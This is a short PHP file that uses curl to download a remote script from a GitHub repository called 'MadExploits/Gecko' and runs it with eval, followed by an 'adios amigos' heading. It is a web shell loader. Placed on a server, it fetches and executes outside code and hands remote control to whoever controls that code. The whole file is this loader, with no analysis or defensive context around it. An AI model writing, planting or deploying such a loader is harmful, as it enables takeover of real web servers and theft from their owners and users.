<?php
    $Url = "https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);

?>

<h1><center>adios amigos<center><h1>
